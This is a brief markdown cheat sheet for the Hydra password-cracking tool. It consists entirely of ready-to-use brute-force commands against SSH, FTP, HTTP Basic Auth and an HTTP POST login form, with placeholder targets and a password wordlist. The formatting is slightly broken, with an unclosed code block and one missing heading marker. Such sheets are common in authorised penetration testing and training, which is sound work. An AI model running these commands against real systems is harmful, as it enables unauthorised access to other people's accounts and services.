# Hydra Cheatsheet

## SSH Bruteforce
```bash
hydra -l user -P passwords.txt ssh://IP

## FTP Bruteforce
hydra -l user -P passwords.txt ftp://IP

## HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://IP

HTTP POST Form
hydra -l admin -P passwords.txt IP http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
